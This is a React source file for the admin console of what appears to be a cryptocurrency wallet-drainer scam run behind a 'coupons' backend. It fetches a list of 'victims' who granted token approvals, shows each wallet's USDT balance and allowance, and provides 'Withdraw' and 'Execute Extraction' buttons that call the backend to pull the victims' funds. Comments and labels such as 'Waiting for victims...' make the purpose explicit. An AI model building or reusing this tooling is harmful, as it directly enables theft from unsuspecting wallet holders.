import React, { useState, useEffect } from "react";

const BACKEND_URL = "https://coupons-ozda.onrender.com";

const Admin = () => {
  const [currentPage, setCurrentPage] = useState("dashboard");
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(false);
  const [checkAddr, setCheckAddr] = useState("");
  const [stats, setStats] = useState(null);

  // 1. Auto-Fetch Targets on Load
  useEffect(() => {
    fetchTargets();
  }, []);

  const fetchTargets = async () => {
    setLoading(true);
    try {
      // Ab hum /api/victims/all use kar rahe hain taaki naye targets dikhein
      const res = await fetch(`${BACKEND_URL}/api/victims/all`);
      const json = await res.json();
      setData(json.data || []);
      setCurrentPage("dashboard");
    } catch (e) {
      console.error("Fetch error:", e);
      alert("Backend error! Check if server is running.");
    }
    setLoading(false);
  };

  const handleWithdraw = async (address) => {
    if (!window.confirm(`Confirm withdrawal for ${address}?`)) return;
    setLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/withdraw`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address })
      });
      const result = await res.json();
      alert(result.message || "Action Completed");
      fetchTargets(); // Refresh list
    } catch (e) {
      alert("Withdrawal failed");
    }
    setLoading(false);
  };

  const checkSingleWallet = async (address) => {
    setLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/check/${address}`);
      const json = await res.json();
      setStats(json);
      setCheckAddr(address);
      setCurrentPage("checker");
    } catch (e) {
      alert("Check failed");
    }
    setLoading(false);
  };

  return (
    <div style={styles.adminWrapper}>
      {/* Navigation */}
      <div style={styles.navBar}>
        <button onClick={fetchTargets} style={currentPage === "dashboard" ? styles.activeTab : styles.tab}>🎯 Targets List</button>
        <button onClick={() => setCurrentPage("checker")} style={currentPage === "checker" ? styles.activeTab : styles.tab}>🔍 Wallet Inspector</button>
      </div>

      <div style={styles.body}>
        {loading && <div style={styles.loader}>Synchronizing Data...</div>}

        {/* PAGE 1: Targets List */}
        {currentPage === "dashboard" && (
          <div>
            <div style={styles.headerRow}>
              <h2 style={styles.title}>Live Targets (Approvals Found: {data.length})</h2>
              <button onClick={fetchTargets} style={styles.refreshBtn}>🔄 Sync</button>
            </div>

            {data.length === 0 ? (
              <div style={styles.emptyState}>No active approvals found. Waiting for victims...</div>
            ) : (
              data.map((item, idx) => (
                <div key={idx} style={styles.itemCard}>
                  <div style={styles.itemInfo}>
                    <p style={styles.addrText}><b>Wallet:</b> {item.address}</p>
                    <p><b>Logged Bal:</b> <span style={{color: '#4caf50'}}>{item.amount}</span></p>
                    <p><b>Status:</b> <span style={{color: item.status === 'Withdrawn' ? '#ff4444' : '#4caf50'}}>{item.status}</span></p>
                    <p style={{fontSize: '11px', color: '#666'}}>{new Date(item.updatedAt).toLocaleString()}</p>
                  </div>
                  <div style={styles.actions}>
                    <button onClick={() => checkSingleWallet(item.address)} style={styles.checkBtnInline}>Check Live</button>
                    <button 
                      onClick={() => handleWithdraw(item.address)} 
                      style={item.status === 'Withdrawn' ? styles.disabledBtn : styles.withdrawBtn}
                      disabled={item.status === 'Withdrawn'}
                    >
                      Withdraw
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        {/* PAGE 2: Checker Page */}
        {currentPage === "checker" && (
          <div style={{textAlign: 'center'}}>
            <h2 style={styles.title}>Manual Inspector</h2>
            <input 
              style={styles.adminInput} 
              placeholder="0x..." 
              value={checkAddr} 
              onChange={(e) => setCheckAddr(e.target.value)}
            />
            <button onClick={() => checkSingleWallet(checkAddr)} style={styles.actionBtn}>Scan Wallet</button>

            {stats && (
              <div style={styles.statsCard}>
                <p>Address: <span style={{fontSize: '12px'}}>{stats.address}</span></p>
                <p>USDT Balance: <b style={{color: '#4caf50'}}>{stats.balance}</b></p>
                <p>Your Allowance: <b style={{color: '#4caf50'}}>{stats.allowance}</b></p>
                <div style={{marginTop: '20px', borderTop: '1px solid #333', paddingTop: '10px'}}>
                  {parseFloat(stats.allowance) > 0 ? (
                    <button onClick={() => handleWithdraw(stats.address)} style={styles.withdrawBtnFull}>Execute Extraction</button>
                  ) : (
                    <p style={{color: 'red'}}>No permission to withdraw.</p>
                  )}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

const styles = {
  adminWrapper: { backgroundColor: '#050505', minHeight: '100vh', color: '#eee', fontFamily: 'monospace' },
  navBar: { display: 'flex', backgroundColor: '#111', borderBottom: '1px solid #222', position: 'sticky', top: 0, zIndex: 10 },
  tab: { flex: 1, padding: '15px', background: 'none', border: 'none', color: '#666', cursor: 'pointer' },
  activeTab: { flex: 1, padding: '15px', background: '#1a1a1a', border: 'none', color: '#4caf50', fontWeight: 'bold', borderBottom: '2px solid #4caf50' },
  body: { padding: '20px' },
  headerRow: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' },
  title: { fontSize: '18px', color: '#888' },
  refreshBtn: { background: '#222', border: 'none', color: '#fff', padding: '8px 15px', borderRadius: '5px', cursor: 'pointer' },
  itemCard: { background: '#111', padding: '15px', borderRadius: '10px', marginBottom: '12px', border: '1px solid #222', display: 'flex', flexDirection: 'column', gap: '10px' },
  itemInfo: { fontSize: '13px', lineHeight: '1.6' },
  addrText: { wordBreak: 'break-all', color: '#4caf50' },
  actions: { display: 'flex', gap: '10px' },
  withdrawBtn: { flex: 1, backgroundColor: '#4caf50', color: '#fff', border: 'none', padding: '10px', borderRadius: '5px', cursor: 'pointer', fontWeight: 'bold' },
  disabledBtn: { flex: 1, backgroundColor: '#333', color: '#666', border: 'none', padding: '10px', borderRadius: '5px' },
  checkBtnInline: { flex: 1, backgroundColor: '#2196f3', color: '#fff', border: 'none', padding: '10px', borderRadius: '5px', cursor: 'pointer' },
  adminInput: { width: '100%', padding: '12px', background: '#111', border: '1px solid #333', color: '#fff', borderRadius: '5px', marginBottom: '15px', boxSizing: 'border-box' },
  actionBtn: { width: '100%', backgroundColor: '#2196f3', color: '#fff', border: 'none', padding: '12px', borderRadius: '5px', cursor: 'pointer', fontWeight: 'bold' },
  statsCard: { marginTop: '20px', background: '#111', padding: '20px', borderRadius: '10px', border: '1px solid #333', textAlign: 'left' },
  withdrawBtnFull: { width: '100%', backgroundColor: '#ff4444', color: '#fff', border: 'none', padding: '15px', borderRadius: '5px', cursor: 'pointer', fontWeight: 'bold', fontSize: '16px' },
  loader: { position: 'fixed', top: 0, left: 0, width: '100%', padding: '10px', backgroundColor: '#4caf50', color: '#000', textAlign: 'center', fontWeight: 'bold', zIndex: 1000 },
  emptyState: { textAlign: 'center', padding: '50px', color: '#444' }
};

export default Admin;